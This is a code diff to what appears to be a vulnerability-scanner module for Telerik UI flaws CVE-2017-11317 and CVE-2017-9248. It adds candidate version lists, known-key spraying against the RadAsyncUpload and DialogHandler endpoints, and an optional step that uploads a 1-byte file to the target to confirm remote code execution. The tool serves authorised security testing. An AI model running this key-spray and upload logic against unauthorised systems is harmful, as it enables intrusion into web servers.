@@ -1,5 +1,8 @@
 import base64
 import itertools
+import re
+from pathlib import Path
+from typing import Optional
 
 from Crypto.Cipher import AES
 from badsecrets import modules_loaded
@@ -43,48 +46,49 @@ class telerik(BaseModule):
         "author": "@liquidsec",
     }
 
-    telerik_versions = [
-        "2007.1423",
-        "2007.1521",
-        "2007.1626",
-        "2007.2918",
-        "2007.21010",
-        "2007.21107",
-        "2007.31218",
-        "2007.31314",
-        "2007.31425",
-        "2008.1415",
-        "2008.1515",
-        "2008.1619",
-        "2008.2723",
-        "2008.2826",
-        "2008.21001",
-        "2008.31105",
-        "2008.31125",
-        "2008.31314",
-        "2009.1311",
-        "2009.1402",
-        "2009.1527",
-        "2009.2701",
-        "2009.2826",
-        "2009.31103",
-        "2009.31208",
-        "2009.31314",
-        "2010.1309",
-        "2010.1415",
-        "2010.1519",
-        "2010.2713",
-        "2010.2826",
-        "2010.2929",
-        "2010.31109",
-        "2010.31215",
-        "2010.31317",
-        "2011.1315",
-        "2011.1413",
-        "2011.1519",
-        "2011.2712",
-        "2011.2915",
-        "2011.31115",
+    # Pre-CVE-2017-11317 (Telerik shipped default keys until R2 2017 SP2 / 2017.2.711).
+    _TELERIK_VERSIONS_PREPATCH = [
+        "2007.1.423",
+        "2007.1.521",
+        "2007.1.626",
+        "2007.2.918",
+        "2007.2.1010",
+        "2007.2.1107",
+        "2007.3.1218",
+        "2007.3.1314",
+        "2007.3.1425",
+        "2008.1.415",
+        "2008.1.515",
+        "2008.1.619",
+        "2008.2.723",
+        "2008.2.826",
+        "2008.2.1001",
+        "2008.3.1105",
+        "2008.3.1125",
+        "2008.3.1314",
+        "2009.1.311",
+        "2009.1.402",
+        "2009.1.527",
+        "2009.2.701",
+        "2009.2.826",
+        "2009.3.1103",
+        "2009.3.1208",
+        "2009.3.1314",
+        "2010.1.309",
+        "2010.1.415",
+        "2010.1.519",
+        "2010.2.713",
+        "2010.2.826",
+        "2010.2.929",
+        "2010.3.1109",
+        "2010.3.1215",
+        "2010.3.1317",
+        "2011.1.315",
+        "2011.1.413",
+        "2011.1.519",
+        "2011.2.712",
+        "2011.2.915",
+        "2011.3.1115",
         "2011.3.1305",
         "2012.1.215",
         "2012.1.411",
@@ -109,6 +113,7 @@ class telerik(BaseModule):
         "2014.3.1024",
         "2015.1.204",
         "2015.1.225",
+        "2015.1.401",
         "2015.2.604",
         "2015.2.623",
         "2015.2.729",
@@ -117,12 +122,12 @@ class telerik(BaseModule):
         "2015.3.1111",
         "2016.1.113",
         "2016.1.225",
+        "2016.1.1213",
         "2016.2.504",
         "2016.2.607",
         "2016.3.914",
         "2016.3.1018",
         "2016.3.1027",
-        "2016.1.1213",
         "2017.1.118",
         "2017.1.228",
         "2017.2.503",
@@ -130,6 +135,80 @@ class telerik(BaseModule):
         "2017.2.711",
         "2017.3.913",
     ]
+
+    # Post-patch versions still show up with placeholder default keys in real deployments
+    # (admins who copy web.config example values without regenerating). 2018.1.117 is the
+    # last PBKDF1_MS release before the switch to PBKDF2.
+    _TELERIK_VERSIONS_PATCHED = [
+        "2018.1.117",
+        "2018.2.516",
+        "2018.2.710",
+        "2018.3.910",
+        "2019.1.115",
+        "2019.1.215",
+        "2019.2.514",
+        "2019.3.917",
+        "2019.3.1023",
+        "2020.1.114",
+        "2020.1.219",
+        "2020.2.512",
+        "2020.2.617",
+        "2020.3.915",
+        "2020.3.1021",
+        "2021.1.119",
+        "2021.1.224",
+        "2021.1.330",
+        "2021.2.511",
+        "2021.2.616",
+        "2021.3.914",
+        "2021.3.1111",
+        "2022.1.119",
+        "2022.1.302",
+        "2022.2.511",
+        "2022.2.622",
+        "2022.3.913",
+        "2022.3.921",
+        "2022.3.1109",
+        "2023.1.117",
+        "2023.1.314",
+        "2023.1.323",
+        "2023.1.425",
+        "2023.2.606",
+        "2023.2.718",
+        "2023.2.829",
+        "2023.3.1010",
+        "2023.3.1114",
+        "2024.1.130",
+        "2024.1.312",
+        "2024.1.319",
+        "2024.2.513",
+        "2024.2.514",
+        "2024.3.806",
+        "2024.3.924",
+        "2024.3.1015",
+        "2024.4.1112",
+        "2024.4.1113",
+        "2024.4.1114",
+        "2025.1.211",
+        "2025.1.218",
+        "2025.1.416",
+        "2025.2.520",
+        "2025.2.528",
+        "2025.2.609",
+        "2025.3.812",
+        "2025.3.825",
+    ]
+
+    # Combined pre-patch + patched + undotted variants of pre-patch. Telerik shipped some
+    # early releases with an undotted revision (2011.3.1115 also appeared as 2011.31115), so
+    # both formats have to be tried when the target's actual manifest is unknown.
+    telerik_versions = list(
+        dict.fromkeys(
+            _TELERIK_VERSIONS_PREPATCH
+            + _TELERIK_VERSIONS_PATCHED
+            + [re.sub(r"\.(?=\d+$)", "", v) for v in _TELERIK_VERSIONS_PREPATCH]
+        )
+    )
 
     dialoghandler_urls = [
         "Telerik.Web.UI.DialogHandler.aspx",
@@ -170,7 +249,7 @@ class telerik(BaseModule):
         rau_confirm_version: bool = Field(
             False,
             description=(
-                "WARNING: writes a benign 1-byte file to the target's C:\\Windows\\Temp\\ on success. "
+                "WARNING: writes a benign 1-byte file to the target's C:\\windows\\temp\\ on success. "
                 "Iterates candidate Telerik versions with default keys; the version that uploads is "
                 "the installed one, which also confirms RCE."
             ),
@@ -191,6 +270,10 @@ class telerik(BaseModule):
             False,
             description="Also spray ASP.NET machineKey values (thousands of keys, much slower).",
         )
+        custom_secrets: Optional[str] = Field(
+            None,
+            description="Path to a file with additional Telerik hash/encryption keys to spray, one per line.",
+        )
 
     in_scope_only = True
 
@@ -200,8 +283,15 @@ class telerik(BaseModule):
 
     async def setup(self):
         self._rau_confirmed = set()
-        self._enc = Telerik_EncryptionKey()
-        self._hash = Telerik_HashKey()
+        custom_secrets = self.config.get("custom_secrets", None)
+        if custom_secrets:
+            path = Path(custom_secrets).expanduser()
+            if not path.is_file():
+                return False, f"custom_secrets file [{custom_secrets}] not found"
+            self.info(f"Loaded custom Telerik key list from [{custom_secrets}]")
+            custom_secrets = str(path)
+        self._enc = Telerik_EncryptionKey(custom_resource=custom_secrets)
+        self._hash = Telerik_HashKey(custom_resource=custom_secrets)
         return True
 
     @staticmethod
@@ -241,14 +331,21 @@ class telerik(BaseModule):
         """
         kdf_mode = None
         if self.config.get("try_known_keys"):
+            self.verbose(f"Fingerprinting DialogHandler KDF mode at {dh_url}")
             kdf_mode = await self._detect_kdf_mode(dh_url)
+            self.verbose(f"DialogHandler KDF mode: [{kdf_mode}]")
             if kdf_mode in ("PBKDF1_MS", "PBKDF2"):
+                self.verbose(f"Spraying known keys against DialogHandler ({kdf_mode})")
                 if await self._probe_dialoghandler_knownkey(dh_url, event, kdf_mode):
                     return
+                self.verbose("Known-key spray exhausted, no match")
         if self.config.get("probe_dialoghandler_oracle"):
             if kdf_mode is None:
+                self.verbose(f"Fingerprinting DialogHandler KDF mode at {dh_url}")
                 kdf_mode = await self._detect_kdf_mode(dh_url)
+                self.verbose(f"DialogHandler KDF mode: [{kdf_mode}]")
             if kdf_mode == "PBKDF1_MS":
+                self.verbose("Running dp_cryptomg find_baseline byte-oracle probe (up to 81 requests)")
                 await self._probe_dialoghandler_oracle(dh_url, event)
 
     def _base_url(self, event):
@@ -293,70 +390,128 @@ class telerik(BaseModule):
             context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik RAU Handler",
         )
 
-        # Safe probe: fake-version payload with default keys. Assembly load fails before file write,
-        # so a hit proves the crypto works without persisting anything on the target.
-        await self._probe_rau_default_keys(url, event)
-
-        if self.config.get("rau_confirm_version") and base_url not in self._rau_confirmed:
-            self._rau_confirmed.add(base_url)
-            await self._confirm_rau_knownkey(url, event, base_url)
-
-    async def _probe_rau_default_keys(self, url, event):
-        """
-        Send fake-version payloads with default keys across each (KDF, HMAC) variant.
-        Response `Could not load file or assembly` = crypto succeeded, .NET failed to load
-        the bogus assembly type -> default keys accepted, no file uploaded.
-        """
-        for kdf_mode, include_hmac in self._RAU_PROBE_VARIANTS:
-            payload = self._build_rau_multipart(
-                self._RAU_FAKE_VERSION, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY, kdf_mode, include_hmac
-            )
-            response = await self.helpers.request(url, method="POST", files=payload)
-            if not response or "Could not load file or assembly" not in response.text:
-                continue
-            self.debug(f"RAU default keys accepted (KDF={kdf_mode}, HMAC={include_hmac})")
-            await self.emit_event(
-                {
-                    "host": str(event.host),
-                    "url": url,
-                    "description": (
-                        f"Telerik RAU accepts default keys (KDF={kdf_mode}, HMAC={include_hmac}). "
-                        "RCE is achievable once the exact installed Telerik version is identified; "
-                        "no file was uploaded by this probe."
-                    ),
-                    "name": "Telerik RAU Default Keys Accepted (CVE-2017-11317)",
-                    "severity": "HIGH",
-                    "confidence": "HIGH",
-                },
-                "FINDING",
-                event,
-                context=f"{{module}} confirmed default RAU keys at {url} without uploading",
-            )
+        # Safe probe: fake-version payloads with each candidate key pair. Assembly load fails
+        # before any file write, so a hit proves keys+crypto work without persisting anything.
+        self.verbose(f"Probing RAU for known keys with fake version {self._RAU_FAKE_VERSION} (no upload)")
+        key_material = await self._probe_rau_known_keys(url)
+        if key_material is None:
+            self.verbose(f"RAU key spray exhausted, no known keys accepted at {url}")
             return
 
-    async def _confirm_rau_knownkey(self, url, event, base_url):
-        """
-        Version-identification + exploit. Iterate real Telerik versions with default keys;
-        the one producing `{"fileInfo":` also uploads the benign 1-byte probe file to the
-        target's C:\\Windows\\Temp\\. Only runs when rau_confirm_version=True.
-        """
-        for version in self.telerik_versions:
-            if int(version[:4]) <= 2017 or version == "2018.1.117":
-                kdf_mode = "PBKDF1_MS"
-            else:
-                kdf_mode = "PBKDF2"
-            include_hmac = int(version[:4]) >= 2017
-            payload = self._build_rau_multipart(
-                version, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY, kdf_mode, include_hmac
+        kdf_mode, include_hmac, hash_key, enc_key = key_material
+        self.verbose(
+            f"RAU accepted key pair (KDF={kdf_mode}, HMAC={include_hmac}) — hash=[{hash_key}] enc=[{enc_key}]"
+        )
+
+        if not self.config.get("rau_confirm_version"):
+            self.verbose("rau_confirm_version disabled; emitting HIGH finding without version identification")
+            await self._emit_rau_keys_accepted(url, event, key_material, version_attempted=False)
+            return
+
+        if base_url in self._rau_confirmed:
+            return
+        self._rau_confirmed.add(base_url)
+
+        self.verbose(
+            f"rau_confirm_version enabled; iterating {len(self.telerik_versions)} candidate versions "
+            "to identify installed one (this will upload a 1-byte file on match)"
+        )
+        if not await self._confirm_rau_version(url, event, base_url, key_material):
+            # Version identification failed with these keys; fall back to the HIGH finding
+            # so the user still learns keys are accepted.
+            self.verbose(
+                "Version Detection Failed (target version not in candidate list); emitting HIGH keys-accepted finding"
             )
+            await self._emit_rau_keys_accepted(url, event, key_material, version_attempted=True)
+
+    def _iter_rau_key_pairs(self):
+        """
+        Yield (hash_key, enc_key) candidates for the RAU handler. The labeled RAU defaults
+        come first (most common), then the full badsecrets keylists if try_known_keys is on.
+        Duplicates are suppressed.
+        """
+        yield (RAU_DEFAULT_HASH_KEY, RAU_DEFAULT_ENC_KEY)
+        if not self.config.get("try_known_keys"):
+            return
+        include_machinekeys = self.config.get("include_machinekeys", False)
+        seen = {(RAU_DEFAULT_HASH_KEY, RAU_DEFAULT_ENC_KEY)}
+        hash_keys = list(self._hash.prepare_keylist(include_machinekeys=include_machinekeys))
+        enc_keys = list(self._enc.prepare_keylist(include_machinekeys=include_machinekeys))
+        for hk in hash_keys:
+            for ek in enc_keys:
+                pair = (hk, ek)
+                if pair in seen:
+                    continue
+                seen.add(pair)
+                yield pair
+
+    async def _probe_rau_known_keys(self, url):
+        """
+        For each (KDF, HMAC) variant × (hash_key, enc_key) pair, POST a fake-version payload.
+        `Could not load file or assembly` in the response means crypto worked and .NET rejected
+        the bogus version before touching the file write path. Returns the discovered
+        (kdf_mode, include_hmac, hash_key, enc_key) or None. Does not emit.
+        """
+        for kdf_mode, include_hmac in self._RAU_PROBE_VARIANTS:
+            for hash_key, enc_key in self._iter_rau_key_pairs():
+                payload = self._build_rau_multipart(self._RAU_FAKE_VERSION, enc_key, hash_key, kdf_mode, include_hmac)
+                response = await self.helpers.request(url, method="POST", files=payload)
+                if response and "Could not load file or assembly" in response.text:
+                    self.debug(
+                        f"RAU accepts key pair enc=[{enc_key}] hash=[{hash_key}] (KDF={kdf_mode}, HMAC={include_hmac})"
+                    )
+                    return (kdf_mode, include_hmac, hash_key, enc_key)
+        return None
+
+    async def _emit_rau_keys_accepted(self, url, event, key_material, version_attempted):
+        kdf_mode, include_hmac, hash_key, enc_key = key_material
+        is_default = (hash_key, enc_key) == (RAU_DEFAULT_HASH_KEY, RAU_DEFAULT_ENC_KEY)
+        key_label = "Default" if is_default else "Known"
+        version_note = (
+            "Version detection was attempted but failed — target's installed Telerik version is not in the candidate list."
+            if version_attempted
+            else "Version detection was not executed."
+        )
+        await self.emit_event(
+            {
+                "host": str(event.host),
+                "url": url,
+                "description": (
+                    f"Telerik RAU accepts a {key_label.lower()} key pair. "
+                    f"Hash key: [{hash_key}] Encryption key: [{enc_key}] "
+                    f"KDF: [{kdf_mode}] HMAC: [{include_hmac}]. {version_note}"
+                ),
+                "name": f"Telerik RAU {key_label} Keys Accepted (CVE-2017-11317)",
+                "severity": "HIGH",
+                "confidence": "HIGH",
+            },
+            "FINDING",
+            event,
+            context=f"{{module}} confirmed RAU key acceptance at {url} without uploading",
+        )
+
+    async def _confirm_rau_version(self, url, event, base_url, key_material):
+        """
+        Version identification + RCE confirmation. Iterate Telerik versions with the KEY
+        MATERIAL already proven by the safe probe; the first version producing `fileInfo`
+        also uploads the benign 1-byte probe file to the target's C:\\windows\\temp\\.
+        Returns True if a version was matched (and the CRITICAL finding emitted).
+        """
+        kdf_mode, include_hmac, hash_key, enc_key = key_material
+        for version in self.telerik_versions:
+            payload = self._build_rau_multipart(version, enc_key, hash_key, kdf_mode, include_hmac)
             response = await self.helpers.request(url, method="POST", files=payload)
             if response and '"fileInfo":' in response.text:
-                self.debug(f"Confirmed RAU RCE (version: {version})")
+                self.verbose(f"RAU RCE confirmed on version {version}; benign file was uploaded to target")
                 await self.emit_event(
                     {
                         "host": str(event.host),
                         "url": url,
-                        "description": f"Confirmed Telerik RAU RCE (version: {version}, key: default)",
+                        "description": (
+                            f"Confirmed Telerik RAU RCE. Version: [{version}] "
+                            f"Hash key: [{hash_key}] Encryption key: [{enc_key}] "
+                            f"KDF: [{kdf_mode}] HMAC: [{include_hmac}]"
+                        ),
                         "name": "Telerik RAU RCE (CVE-2017-11317)",
                         "severity": "CRITICAL",
                         "confidence": "CONFIRMED",
@@ -365,7 +520,8 @@ class telerik(BaseModule):
                     event,
                     context=f"{{module}} confirmed {{event.type}}: Telerik RAU RCE at {base_url}",
                 )
-                return
+                return True
+        return False
 
     def _rau_encrypt(self, plaintext, key, iv):
         """AES-256-CBC with the null-byte-interleaved plaintext encoding Telerik RAU uses."""
@@ -391,7 +547,7 @@ class telerik(BaseModule):
             key, iv = self._enc.telerik_derivekeys_PBKDF2(enc_key)
 
         enc_target_folder = self._rau_sign(self._rau_encrypt("", key, iv), hash_key, include_hmac)
-        enc_temp_folder = self._rau_sign(self._rau_encrypt("C:\\Windows\\Temp\\", key, iv), hash_key, include_hmac)
+        enc_temp_folder = self._rau_sign(self._rau_encrypt("C:\\windows\\temp\\", key, iv), hash_key, include_hmac)
         rau_post_data_json = (
             f'{{"TargetFolder":"{enc_target_folder}",'
             f'"TempTargetFolder":"{enc_temp_folder}",'
@@ -402,7 +558,7 @@ class telerik(BaseModule):
             '"UseApplicationPoolImpersonation":false}'
         )
         assembly_type = (
-            f"Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version={assembly_version}, "
+            f'Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version="{assembly_version}", '
             "Culture=neutral, PublicKeyToken=121fae78165ba3d4"
         )
         rau_post_data = f"{self._rau_encrypt(rau_post_data_json, key, iv)}&{self._rau_encrypt(assembly_type, key, iv)}"
@@ -457,7 +613,7 @@ class telerik(BaseModule):
 
     async def _emit_dialoghandler(self, base_url, dh, event):
         dh_url = f"{base_url}{dh}"
-        self.debug(f"Detected Telerik DialogHandler ({dh})")
+        self.verbose(f"Detected Telerik DialogHandler at {dh_url}")
         await self.emit_event(
             {
                 "host": str(event.host),
@@ -512,7 +668,7 @@ class telerik(BaseModule):
                 "Index was outside the bounds of the array." in text
                 or "String was not recognized as a valid Boolean." in text
             ):
-                self.debug(f"CVE-2017-9248 baseline hit on combo {combo!r}")
+                self.verbose(f"dp_cryptomg baseline probe leaked on 4-byte combo {combo!r}; oracle confirmed")
                 await self.emit_event(
                     {
                         "host": str(event.host),
@@ -575,7 +731,7 @@ class telerik(BaseModule):
             if not response:
                 continue
             if "The input data is not a complete block" in response.text:
-                self.debug(f"Matched Telerik hash key: {hash_key}")
+                self.verbose(f"DialogHandler hash key matched: [{hash_key}]")
                 return hash_key
         return None
 
@@ -588,7 +744,7 @@ class telerik(BaseModule):
             if not response:
                 continue
             if "Index was outside the bounds of the array" in response.text:
-                self.debug(f"Matched Telerik encryption key: {enc_key}")
+                self.verbose(f"DialogHandler encryption key matched: [{enc_key}]")
                 return enc_key
         return None
 
@@ -609,7 +765,7 @@ class telerik(BaseModule):
                 if not response:
                     continue
                 if abs(len(response.text) - baseline_size) > 10:
-                    self.debug(f"Matched Telerik PBKDF2 key pair: {hash_key} / {enc_key}")
+                    self.verbose(f"DialogHandler PBKDF2 key pair matched: hash=[{hash_key}] enc=[{enc_key}]")
                     return hash_key, enc_key
         return None
 
